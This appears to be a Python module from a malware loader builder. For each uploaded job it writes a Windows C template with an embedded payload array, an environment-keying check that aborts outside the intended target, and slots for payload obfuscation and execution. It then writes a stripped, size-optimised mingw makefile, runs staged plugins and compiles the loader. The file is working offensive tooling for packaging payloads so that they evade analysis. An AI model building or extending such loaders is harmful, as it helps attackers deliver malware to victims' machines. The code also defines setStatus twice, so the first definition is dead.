from app import Log
import os
from time import sleep
from contextlib import contextmanager
import importlib
import subprocess

def setStatus(id):
    filename = f'./uploads/{id}/status'

    try:
        with open(filename, 'r') as file:
            # File exists, now overwrite its contents with "Finished"
            pass
        with open(filename, 'w') as file:
            file.write("Finished")
    except FileNotFoundError:
        # File does not exist, create it and write "Working"
        with open(filename, 'w') as file:
            file.write("Working")

def setStatus():
    filename = f'./status'

    try:
        with open(filename, 'r') as file:
            # File exists, now overwrite its contents with "Finished"
            pass
        with open(filename, 'w') as file:
            file.write("Finished")
    except FileNotFoundError:
        # File does not exist, create it and write "Working"
        with open(filename, 'w') as file:
            file.write("Working")

def setTemplate():
    os.makedirs(f'./src/')

    filename = f'./src/main.c'

    template = '''\
#include <windows.h>
{{LIBS}}

{{FUNCTIONS}}

const unsigned char pPayload[] = {
	{{PAYLOAD}}
};

int main() {
    BOOL SafeEnv = TRUE;

{{KEYING}}

    if (SafeEnv == FALSE)
        return 0;

{{PAYLOAD_MODS}}

{{EXECUTION}}

	return 0;
}\
'''

    with open(filename, 'w') as file:
        file.write(template)

def setMakefile():
    filename = f'./makefile'

    content = '''\
ProjectName		= result

CCX64			= x86_64-w64-mingw32-gcc

CFLAGS			=  -Os -fno-asynchronous-unwind-tables
CFLAGS 			+= -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS  		+= -s -ffunction-sections -falign-jumps=1 -w
CFLAGS			+= -Wl,-s,--no-seh,--enable-stdcall-fixup
{{CFLAGS}}

CLIBS			= {{CLIBS}}

SOURCES			=  src/*.c

all: x64

x64:
	@ $(CCX64) $(SOURCES) $(CFLAGS) $(CLIBS) -o $(ProjectName).exe
\
'''

    with open(filename, 'w') as file:
        file.write(content)

def cleanTemplate():
    filename = f'./src/main.c'

    # Open the file in read mode
    with open(filename, 'r') as file:
        content = file.read()
    
    # Clean Template
    content = content.replace('\n{{LIBS}}\n', '')
    content = content.replace('\n{{FUNCTIONS}}', '')
    content = content.replace('\n{{PAYLOAD}}', '')
    content = content.replace('\n{{KEYING}}', '')
    content = content.replace('\n{{PAYLOAD_MODS}}', '')
    content = content.replace('\n{{EXECUTION}}', '')

    # Open the file in write mode and write the modified content
    with open(filename, 'w') as file:
        file.write(content)

def cleanMakefile():
    filename = f'./makefile'

    # Open the file in read mode
    with open(filename, 'r') as file:
        content = file.read()
    
    # Clean Template
    content = content.replace('\n{{CFLAGS}}\n', '')
    content = content.replace(' {{CLIBS}}', '')

    # Open the file in write mode and write the modified content
    with open(filename, 'w') as file:
        file.write(content)

@contextmanager
def temporary_chdir(id):
    origin = os.getcwd()
    try:
        sleep(1)
        os.chdir(f'./uploads/{id}')
        yield
    finally:
        os.chdir(origin)

def generateLdr(id, plugins):
    with temporary_chdir(id):
        Log.info(f"[\033[34m{id}\033[0m] Setting working status")
        setStatus()

        Log.info(f"[\033[34m{id}\033[0m] Setting makefile")
        setMakefile()

        Log.info(f"[\033[34m{id}\033[0m] Setting template")
        setTemplate()

        Log.info(f"[\033[34m{id}\033[0m] Running plugins")

        # Run Keying
        for plugin in plugins["keying"]:
            plugPath = "plugins" + plugin.replace("/", ".") + ".run"
            Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
            importlib.import_module(plugPath).run()
            
        # Run Payload mods
        for plugin in plugins["payload_mods"]:
            plugPath = "plugins" + plugin.replace("/", ".") + ".run"
            Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
            importlib.import_module(plugPath).run()

        # Run Execution
        for plugin in plugins["execution"]:
            plugPath = "plugins" + plugin.replace("/", ".") + ".run"
            Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
            importlib.import_module(plugPath).run()

        # Run Pre Compilation
        for plugin in plugins["pre_comp"]:
            plugPath = "plugins" + plugin.replace("/", ".") + ".run"
            Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
            importlib.import_module(plugPath).run()

        Log.info(f"[\033[34m{id}\033[0m] Cleaning up makefile")
        cleanMakefile()

        Log.info(f"[\033[34m{id}\033[0m] Cleaning up template")
        cleanTemplate()

        Log.info(f"[\033[34m{id}\033[0m] Compiling loader")
        make_process = subprocess.Popen("make", stderr=subprocess.STDOUT)
        if make_process.wait() != 0:
            Log.error(f"[\033[34m{id}\033[0m] Error when compiling")
        Log.info(f"[\033[34m{id}\033[0m] Compiling completed")

        # Run Post Compilation
        for plugin in plugins["post_comp"]:
            plugPath = "plugins" + plugin.replace("/", ".") + ".run"
            Log.info(f"[\033[34m{id}\033[0m] Running plugin: {importlib.import_module(plugPath).desc()}")
            importlib.import_module(plugPath).run()

        Log.info(f"[\033[34m{id}\033[0m] Work done, updating status")
        setStatus()